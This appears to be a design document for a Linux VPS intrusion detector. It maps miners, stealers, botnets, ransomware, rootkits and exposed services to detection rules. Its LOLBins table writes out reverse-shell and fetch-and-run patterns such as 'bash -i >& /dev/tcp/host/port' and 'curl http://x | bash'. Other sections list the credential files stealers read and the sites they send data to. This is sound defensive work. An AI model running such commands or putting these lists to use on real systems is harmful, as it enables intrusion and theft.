# Linux VPS attack landscape (2024–2026)

This doc captures the threat actors, malware families, and behavioral fingerprints vpsguard is built to catch. It's curated from public reporting (Sysdig, Aqua, CADO, Wiz, Trend Micro, Palo Alto Unit 42, Microsoft, Mandiant, Akamai, Cloudflare, CISA KEV) and is intentionally **behavior-first**, not name-first — names rotate, behaviors don't.

For each category we list:
- **Behavioral fingerprint** — the signal vpsguard fires on
- **vpsguard hit** — which detector catches it today
- **Gap** — what's still uncovered

---

## 1. Crypto miners (~70% of all VPS compromise)

### Active families
| Family | First-seen | Notes |
|---|---|---|
| **Kinsing** + `kdevtmpfsi` | 2020 → still active | Java/Confluence/Atlassian RCE, Redis CONFIG SET dir, Docker socket, exposed Hadoop YARN; drops `/var/tmp/kinsing` + `/tmp/kdevtmpfsi`; cron at `/etc/cron.d/`; killer module murders competing miners |
| **TeamTNT** | 2020 → resurgent 2024 | Cloud-credential theft + miner; reads `~/.aws/credentials`, IMDS metadata; uses Diamorphine LKM rootkit; xmrig variants |
| **8220 Mining Gang** | 2017 → 2025 | Confluence, Apache Druid, Oracle WebLogic, Redis; PowerLand / TaurusLoader; xmrig in `/tmp/.X11-unix/.X*` |
| **Diicot (Mexals)** | 2021 → 2025 | Romanian operator; SSH brute-force; drops `/tmp/.diicot`; persistence via `~/.bash_aliases`, `/etc/rc.local` |
| **P2PInfect** | 2023 → 2025 | Rust-based, Redis-targeted, P2P C2 over libp2p; drops `linux` binary in `/tmp` |
| **OracleIV** | 2023 → 2024 | Docker socket exploitation, drops `oracleiv_latest` image |
| **Skidmap / Skidmap-NG** | 2018 → 2024 | LKM rootkit hides processes, fake `/proc/meminfo` to mask CPU usage, replaces `pam_unix.so` |
| **WatchDog / WatchDogs** | 2019 → 2024 | Mass-scanning Go binary, drops in `/usr/local/bin/sysupdate` |
| **RudeMiner / SilentBob** | 2024 | Container-targeting, drops in `/tmp/.X-unix/` |
| **Hezb / NanoMiner** | 2023 → 2025 | Hadoop/PostgreSQL targeted |

### Universal behavioral fingerprint

| Signal | vpsguard hit | Severity |
|---|---|---|
| Binary running from `/tmp`, `/var/tmp`, `/dev/shm`, `/run/lock` | `process.suspicious` | high |
| Same binary + outbound to public IP | `process.tmp_with_outbound` | **critical** |
| Sustained ≥50% on one core | `process.high_cpu` | high |
| Sustained ≥90% whole-machine | `cpu.spike` | high |
| Outbound to stratum ports 3333/4444/5555/7777/14444 | `outbound.miner_pool` | high |
| Process name matches xmrig/kinsing/kdevtmpfsi/t-rex/etc. | `process.known_miner` | high |
| Cron job dropped under `/etc/cron.d/` | `cron.modified` | high |
| LKM rootkit hides PIDs | `rootkit.suspicious` | high |
| `/etc/ld.so.preload` modified (libprocesshider) | filewatch | critical |

### Gaps
- Skidmap's fake `/proc/meminfo` (rootkit returns lies) — would need eBPF or custom syscall hooking. v2 work.
- P2P C2 over libp2p — looks like normal outbound traffic. Catchable via `outbound.bulk_transfer` only at scale.

---

## 2. Info-stealers, RATs, clippers, keyloggers

### Active families
| Family | What it steals |
|---|---|
| **Symbiote** | LD_PRELOAD-injected userland rootkit, hooks libc to hide files/procs, exfils SSH creds |
| **BPFDoor** | eBPF program loaded as backdoor; magic-packet activation; hides from `ss`/`netstat` |
| **RedXOR** | Process injection, file ops, port scan |
| **PingPull / Sword2033** | Linux variants of Mustang Panda's tooling |
| **Loki Linux** | Stealer port — credentials, browser data, crypto wallets |
| **Pumakit** | Userland + kernel rootkit chain |
| **GobRAT** | Go-written RAT for routers + Linux servers |
| **PondRAT (Lazarus)** | Python-based, npm-distributed |
| **XZ-utils backdoor (CVE-2024-3094)** | sshd backdoor via supply-chain compromise of `liblzma` |

### What they read

| Path | vpsguard hit |
|---|---|
| `/etc/shadow`, `/etc/sudoers` | `process.credential_access` (NEW — /proc/PID/fd scan) |
| `~/.ssh/id_rsa`, `~/.ssh/id_ed25519` | `process.credential_access` |
| `~/.aws/credentials`, `~/.aws/config` | `process.credential_access` |
| `~/.config/gcloud/` | `process.credential_access` |
| `~/.azure/` | (add) |
| `~/.docker/config.json` | `process.credential_access` |
| `~/.kube/config` | `process.credential_access` (codex extended) |
| `~/.npmrc`, `~/.pypirc` | `process.credential_access` (codex extended) |
| `~/.git-credentials`, `~/.config/gh/hosts.yml` | `process.credential_access` |
| `~/.bash_history`, `~/.zsh_history` | `process.credential_access` |
| `/dev/input/event*` (keylogger) | `process.credential_access` |
| `$SSH_AUTH_SOCK` (`/tmp/ssh-*/agent.*`, `/run/user/<uid>/keyring/ssh`) | (add — easy fdscan extension) |
| `/var/run/secrets/kubernetes.io/serviceaccount/token` | (add — k8s pod token theft) |
| Cloud metadata IMDS (`169.254.169.254`, `fd00:ec2::254`) | `cloud.metadata_access` |

### Where they exfil to
| Service | Why attackers love it | vpsguard hit |
|---|---|---|
| **transfer.sh** | anonymous, curl-based | `threat.known_bad_domain` (when populated) |
| **0x0.st**, **catbox.moe**, **anonfiles.com** | anonymous file drop | same |
| **paste.ee**, **dpaste.com**, **ghostbin** | small-payload exfil | same |
| **Telegram bot API** | hardcoded in many stealers (irony noted) | (gap — needs domain heuristic) |
| **Discord webhook** | `/api/webhooks/...` | `threat.known_bad_domain` (need to ship default list) |
| **Custom C2 / DGA** | rotating | `outbound.bulk_transfer` for volume |
| **DNS tunneling** | C2 over A-record queries | `dns.anomaly` |
| **ngrok, Cloudflare Tunnel** | reverse tunnel out | (gap — process detection) |
| **IPFS** | content-addressed exfil | (gap) |

### Clippers (clipboard hijackers swapping crypto addresses)
- Hook `xclip`/`xsel`/`wl-clipboard`, watch `/tmp/.X11-unix/`, or use `pyperclip` library.
- Mostly desktop-Linux problem; less server-relevant but if VPS is also a remote-desktop, it applies.
- vpsguard fires on the deployment behavior (binary in `/tmp` + outbound) regardless of clipboard tricks.

---

## 3. Botnets, DDoS-for-hire, spam relays

### Active families
| Family | Pivots from |
|---|---|
| **Mirai variants** (Mozi, Aquabot, Hiatus, RapperBot, AndoryuBot) | Telnet, SSH brute-force, IoT firmware CVEs |
| **EnemyBot** | Java RCE chains (Spring4Shell), Apache RocketMQ |
| **Kaiji** | SSH brute-force |
| **Reactor** | mass-scanning + Hadoop YARN + Confluence |
| **FritzFrog** | SSH P2P botnet, no disk drop (memory-resident) |
| **AndoryuBot** | SOCKS5 proxy on victim, sold as residential proxy |

### Outbound abuse signatures
| Behavior | vpsguard hit |
|---|---|
| > 50 unique dst IPs port 22 in 10 min (SSH spray) | `outbound.ssh_spike` |
| > 50 unique dst SMTP IPs (spam relay) | `outbound.smtp_spike` |
| > 20 unique dst RDP IPs | `outbound.rdp_spike` |
| > 1 GiB outbound in sample window | `outbound.bulk_transfer` |
| Telnet brute-force outbound | (add — port 23 spike) |
| VNC brute-force outbound (5900–5910) | (add) |
| DNS amplification (high-pps outbound 53) | (gap — needs pps tracking) |
| NTP / Memcached amplification | (gap) |
| Tor exit / relay setup | listen on 9001/9050 → `service.exposed` (NEW) |
| SOCKS5 residential proxy | listen on 1080 → `service.exposed` |

### Fileless / memory-resident
- **FritzFrog** runs entirely in memory after initial drop. Catch via `process.suspicious reason exe_deleted` (kernel still shows the deleted backing file) and via `outbound.ssh_spike`.

---

## 4. Ransomware on Linux + ESXi + wipers

### Active families targeting Linux
| Family | Notes |
|---|---|
| **Akira (Linux)** | Targets ESXi; `.akira` extension; ChaCha20+RSA |
| **ALPHV/BlackCat ESXi** | Rust; `.bdh*` extension; high-speed parallel encryption |
| **Cl0p Linux** | Targets MOVEit-style + Linux servers |
| **RansomHub** | Targets ESXi, partial-encrypt for speed |
| **LockBit Linux** | ESXi-targeted variant |
| **ESXiArgs** | Mass campaign Feb 2023, still resurgent |
| **Royal / BlackSuit Linux** | ESXi |
| **Hunters International** | Multi-platform |

### Wipers
| Family | Notes |
|---|---|
| **AcidRain / AcidPour** | Russian-ATP wipers; target VPN appliances + Linux routers |
| **HermeticWiper Linux** | Targeted destructive |
| **WhisperGate Linux** | Boot sector + file overwrite |

### Behavioral fingerprint
| Signal | vpsguard hit |
|---|---|
| Mass `rename(2)` calls in `/home`, `/var/www`, `/var/lib/mysql`, `/vmfs/volumes/` | `ransomware.activity` |
| Files getting extension `.akira`/`.lockbit`/`.encrypted`/`.crypt`/`.locked`/`.ryk`/etc. | `ransomware.activity` |
| Ransom-note creation: `README.txt`, `RECOVER-FILES.txt`, `HOW_TO_DECRYPT.html`, `!decrypt!.txt` | `ransomware.activity` |
| ESXi-specific: `vmkfstools` invocation, `esxcli vm process kill`, writes to `/etc/vmware/firewall/` | (add — process detection if running on ESXi) |
| `/etc/shadow` zeroed (wiper) | filewatch (size decrease) |
| Mass `unlink(2)` rate (rm -rf /) | (add — inotify rate per dir) |

---

## 5. Persistence + rootkits + LOLBins

### Common persistence locations vpsguard already watches
- `/etc/cron*` ✓ (filewatch)
- `/var/spool/cron/` ✓
- `/etc/sudoers`, `/etc/sudoers.d/` ✓
- `/etc/passwd`, `/etc/shadow` ✓
- `/root/.ssh/authorized_keys`, `/home/*/.ssh/authorized_keys` ✓
- `/etc/systemd/system/` ✓
- `/etc/ld.so.preload` ✓
- `/etc/profile`, `/etc/bash.bashrc` ✓

### Persistence locations to ADD
| Path | Why attackers use it | Priority |
|---|---|---|
| `/etc/rc.local` | classic boot-time script | high |
| `/etc/update-motd.d/` | runs on every login | high |
| `~/.bashrc`, `~/.bash_profile`, `~/.profile` (per-user) | per-user shell init | high |
| `/etc/pam.d/`, `/lib/security/pam_unix.so`, `/lib64/security/` | PAM module replacement | critical |
| `/etc/ssh/sshd_config` (Match block injection) | SSH backdoor | high |
| `~/.config/systemd/user/` | per-user systemd | medium |
| `/etc/apt/apt.conf.d/`, `/etc/dnf/plugins/` | package manager hooks | medium |
| `/etc/logrotate.d/` | runs as root daily | medium |
| `/etc/NetworkManager/dispatcher.d/` | runs on netif up | medium |

### Rootkits (LKM + userland)
| Rootkit | How vpsguard catches |
|---|---|
| **Diamorphine** | LKM load → `audit.kernel_module`; hidden PID via SIGKILL trick → `rootkit.suspicious` (kill(0) vs /proc) |
| **Reptile** | Same kernel-module load + `/proc` discrepancy |
| **libprocesshider** | `/etc/ld.so.preload` modified → filewatch critical |
| **Bedevil** | LKM load + persistence files |
| **BPFDoor** | eBPF program loaded — needs `bpftool prog show` polling (gap) |
| **Pumakit** | Userland → kernel chain — partial coverage via persistence files |
| **Symbiote** | LD_PRELOAD via `/etc/ld.so.preload` — covered |

### LOLBins (living-off-the-land)
The implant is a one-liner that lives in cron / `.bashrc`, not a binary on disk:

| One-liner pattern | What vpsguard does |
|---|---|
| `* * * * * curl http://x | bash` in cron | (gap — needs cron content scan) |
| `wget -qO- http://x | sh` | same |
| `python -c "import socket,os,pty;..."` reverse shell | `process.suspicious reason dev_tcp_reverse_shell` if shell pattern |
| `bash -i >& /dev/tcp/host/port 0>&1` | same |
| Base64 in cron / `.bashrc` decoded + executed | (gap — needs content scan + base64-decode heuristic) |
| `nc -e /bin/sh` | execve detection covered |

---

## 6. Initial access — most-exploited vectors

### Network-exposed misconfigurations (no CVE needed)
| Service | Default port | Compromise vector |
|---|---|---|
| **Redis** | 6379 | `CONFIG SET dir /var/spool/cron/crontabs` writes a cron entry — **#1 pre-CVE vector** |
| **Docker socket** | 2375/2376 + `/var/run/docker.sock` | run privileged container, escape to host |
| **Kubernetes API** | 6443 | anon-authn enabled → kubectl exec into pod |
| **Kubelet** | 10250 / 10255 | API exec, container compromise |
| **etcd** | 2379 / 2380 | read all secrets |
| **MongoDB** | 27017 | no-auth default in old versions |
| **Elasticsearch** | 9200 | data theft + RCE via groovy/painless in old versions |
| **Memcached** | 11211 | DDoS amplification reflection |
| **Hadoop YARN** | 8088 | unauthenticated job submit |
| **SaltStack** | 4505/4506 | salt-master CVE chain |
| **Webmin** | 10000 | weak default + historical RCEs |
| **HestiaCP / cPanel / Plesk / aaPanel / CyberPanel** | varies | weak admin password + CSRF + RCE chains |
| **Jenkins anonymous** | 8080 | `script` console RCE |
| **Confluence** | 8090 | OGNL injection family of CVEs |
| **VMware ESXi** | 80/443/902 | OpenSLP CVE-2021-21974 (still active!) |

These all map to the **new `service.exposed` detector** I'm shipping below.

### Recently mass-exploited CVEs

| CVE | Software | Notes |
|---|---|---|
| **CVE-2024-3094** | xz-utils → liblzma → sshd | supply-chain backdoor, JIA Tan persona |
| CVE-2023-22515, CVE-2023-22518, CVE-2023-22527 | Confluence | mass-exploited 2023–2025 |
| CVE-2024-21893, CVE-2023-46805 | Ivanti Connect Secure | Chinese APT mass exploit |
| CVE-2023-4966 | Citrix Bleed | session hijack |
| CVE-2024-4577 | PHP-CGI on Windows + Linux | argv injection RCE |
| CVE-2023-46604 | Apache ActiveMQ | broker RCE → Kinsing |
| CVE-2024-23897 | Jenkins | arbitrary file read |
| CVE-2023-49103 | Roundcube | credential theft |
| CVE-2024-7593 | Ivanti vTM | auth bypass |
| CVE-2023-50164 | Apache Struts | path traversal RCE |
| CVE-2024-23692 | Rejetto HFS | RCE |
| CVE-2024-6387 | OpenSSH "regreSSHion" | RCE in glibc-based sshd |
| CVE-2023-7028 | GitLab | account takeover via password reset |

### Cloud-specific
| Vector | vpsguard hit |
|---|---|
| SSRF in app code → IMDS v1 → instance role token | `cloud.metadata_access` |
| Stolen GitHub Actions OIDC token → cloud lateral | (out of scope) |
| Compromised self-hosted CI runner | post-exploit covered |
| Cloud-init secret left in `/var/lib/cloud/instances/*/user-data.txt` | (add — fdscan path) |

---

## 7. The map: detector coverage matrix

| Attack class | Primary detector(s) | Coverage % |
|---|---|---|
| Crypto mining | `process.tmp_with_outbound`, `process.high_cpu`, `cpu.spike`, `outbound.miner_pool`, `process.known_miner` | **~95%** |
| Info-stealer (creds on disk) | `process.credential_access`, `cloud.metadata_access` | **~90%** with codex's expanded paths |
| Memory-only stealer (BPFDoor, Symbiote LD_PRELOAD) | `filewatch` ld.so.preload + `process.suspicious` | ~70% (true memory-resident BPFDoor needs eBPF — v2) |
| SSH brute-force inbound | `ssh.bruteforce.detected`, `ssh.login.after_failures` | ~99% |
| Webshell | `process.webshell` | ~95% |
| Outbound abuse (DDoS/spam) | `outbound.ssh_spike`, `outbound.smtp_spike`, `outbound.rdp_spike`, `outbound.bulk_transfer` | ~95% |
| Persistence | `cron.modified`, `systemd.service.created`, `ssh_key.added`, `sudoer.modified`, `user.created`, filewatch on `/etc/ld.so.preload` | ~85% — gaps: `/etc/rc.local`, motd, PAM, per-user `.bashrc` |
| Ransomware | `ransomware.activity` | ~80% |
| Rootkit (LKM) | `rootkit.suspicious`, `audit.kernel_module` | ~85% |
| Cron-LOLBin one-liners | (cron content scan — shipping below) | — |
| Exposed dangerous service | `service.exposed` (shipping below) | — |
| Tampered tool itself | `agent.binary_modified` | ✓ |
| Agent killed | healthchecks.io silence | ✓ |

---

## 8. What's shipping with this commit

1. **`service.exposed`** — listen-port scanner. Catches the #1 initial-access vector (exposed Redis/Mongo/Docker/etc.)
2. **Default known-bad domain list** — top stealer exfil sites baked in, no config required
3. **Cron content scan** — when a cron file changes, parse for `curl|bash`, `wget|sh`, `base64 -d|sh`, `/dev/tcp/`, references to `/tmp` exec — emits `cron.modified` with reason

After this, the only ATT&CK tactics with significant gaps are:
- **Defense Evasion via eBPF rootkits** (BPFDoor) — needs eBPF detection (v2 roadmap)
- **DNS / NTP / Memcached amplification** — needs PPS tracking (out of MVP scope)
- **Per-user `.bashrc` persistence** — needs per-home filewatch extension (next)
- **PAM module tampering** — FIM should add `/lib/security/`, `/lib64/security/`, `/etc/pam.d/`
